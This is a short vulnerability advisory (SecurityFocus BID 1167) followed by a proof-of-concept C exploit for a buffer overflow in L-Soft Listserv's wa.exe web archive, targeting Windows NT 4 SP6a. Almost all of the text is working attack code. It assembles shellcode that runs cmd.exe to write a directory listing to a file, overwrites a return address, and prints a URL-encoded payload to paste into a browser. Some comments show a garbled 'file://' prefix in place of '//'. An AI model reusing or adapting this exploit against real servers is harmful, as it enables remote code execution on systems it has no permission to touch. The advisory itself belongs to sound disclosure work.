source: http://www.securityfocus.com/bid/1167/info

The Web Archive component of L-Soft Listserv contains unchecked buffer code exploitable by sending specially crafted requests to the Web Archive. This weakness will allow execution of arbitrary code by remote attackers.

/////////////////////////////////////////////////////////////////
//
//
// LSOFT's Listserv web archives wa.exe buffer overflow
//
//
// This is "proof of concept code" and will spawn a shell
// perform a directory listing and redirect the output
// to a file called "cerberus.txt". Will work on Windows NT 4
// SP6a
//
//
// David Litchfield (mnemonix@globalnet.co.uk)
//
// 1st May 2000
//
//
// Cut and paste the output into your web browser.
//
/////////////////////////////////////////////////////////////////

#include <stdio.h>
int main()
{
 unsigned char exploit[2000]="";
 int count = 0;

 while(count <100)
  {
   exploit[count]=0x90;
   count ++;
  }

 // push ebp
 exploit[count]=0x55;
 count ++;

 // mov ebp,esp
 exploit[count]=0x8B;
 count ++;
 exploit[count]=0xEC;
 count ++;

 // mov eax, 0x77f1a986
 exploit[count]=0xb8;
 count ++;
 exploit[count]=0x86;
 count ++;
 exploit[count]=0xa9;
 count ++;
 exploit[count]=0xf1;
 count ++;
 exploit[count]=0x77;
 count ++;

 // mov ebx, 0xffffffff
 exploit[count]=0xbb;
 count ++;
 exploit[count]=0xff;
 count ++;
 exploit[count]=0xff;
 count ++;
 exploit[count]=0xff;
 count ++;
 exploit[count]=0xff;
 count ++;

 file://sub ebx, 0xffffff8B
 exploit[count]=0x83;
 count ++;
 exploit[count]=0xeb;
 count ++;
 exploit[count]=0x8B;
 count ++;

 // push ebx
 exploit[count]=0x53;
 count ++;

 // push "xt.s"
 exploit[count]=0x68;
 count ++;
 exploit[count]=0x73;
 count ++;
 exploit[count]=0x2e;
 count ++;
 exploit[count]=0x74;
 count ++;
 exploit[count]=0x78;
 count ++;

 file://push "ureb"
 exploit[count]=0x68;
 count ++;
 exploit[count]=0x62;
 count ++;
 exploit[count]=0x65;
 count ++;
 exploit[count]=0x72;
 count ++;
 exploit[count]=0x75;
 count ++;

 file://push "rec "
 exploit[count]=0x68;
 count ++;
 exploit[count]=0x20;
 count ++;
 exploit[count]=0x63;
 count ++;
 exploit[count]=0x65;
 count ++;
 exploit[count]=0x72;
 count ++;

 file://push "> ri"
 exploit[count]=0x68;
 count ++;
 exploit[count]=0x69;
 count ++;
 exploit[count]=0x72;
 count ++;
 exploit[count]=0x20;
 count ++;
 exploit[count]=0x3e;
 count ++;

 file://push "d c/"
 exploit[count]=0x68;
 count ++;
 exploit[count]=0x2f;
 count ++;
 exploit[count]=0x63;
 count ++;
 exploit[count]=0x20;
 count ++;
 exploit[count]=0x64;
 count ++;

 file://push " exe"
 exploit[count]=0x68;
 count ++;
 exploit[count]=0x65;
 count ++;
 exploit[count]=0x78;
 count ++;
 exploit[count]=0x65;
 count ++;
 exploit[count]=0x20;
 count ++;


 file://push "cmd."
 exploit[count]=0x68;
 count ++;
 exploit[count]=0x63;
 count ++;
 exploit[count]=0x6d;
 count ++;
 exploit[count]=0x64;
 count ++;
 exploit[count]=0x2e;
 count ++;

 file://mov ebx, esp
 exploit[count]=0x8b;
 count ++;
 exploit[count]=0xdc;
 count ++;

 file://xor esi, esi
 exploit[count]=0x33;
 count ++;
 exploit[count]=0xf6;
 count ++;

 file://push esi
 exploit[count]=0x56;
 count ++;

 file://push ebx
 exploit[count]=0x53;
 count ++;

 file://call eax
 exploit[count]=0xff;
 count ++;
 exploit[count]=0xd0;
 count ++;

 // set a break point (int 3)
 while(count <420)
  {
   exploit[count]=0xCC;
   count ++;
  }


 // overwrite the return address

 exploit[count]=0x36;
 count ++;
 exploit[count]=0x28;
 count ++;
 exploit[count]=0xf3;
 count ++;
 exploit[count]=0x77;
 count ++;

 // put in 40 nops (0x90)

 while (count < 464)
  {
   exploit[count]=0x90;
   count ++;
  }

 // write our code that'll get us back into our un-tolower()ed string

 // move edx, 0xFFFFFFFF
 exploit[count]=0xBA;
 count ++;
 exploit[count]=0xFF;
 count ++;
 exploit[count]=0xFF;
 count ++;
 exploit[count]=0xFF;
 count ++;
 exploit[count]=0xFF;
 count ++;

 // sub edx, 0xFFDFAC87
 exploit[count]=0x81;
 count ++;
 exploit[count]=0xEA;
 count ++;
 exploit[count]=0x87;
 count ++;
 exploit[count]=0xAC;
 count ++;
 exploit[count]=0xDF;
 count ++;
 exploit[count]=0xFF;
 count ++;

 // jmp edx
 exploit[count]=0xFF;
 count ++;
 exploit[count]=0xE2;
 count ++;

 // set readable part in memory to stop first AV

 exploit[390]=0x36;
 exploit[390]=0xf3;
 exploit[391]=0x77;

 count = 0;
 while(count < 477)
  {
   printf("%%%x",exploit[count]);
   count ++;
  }

 return 0;
}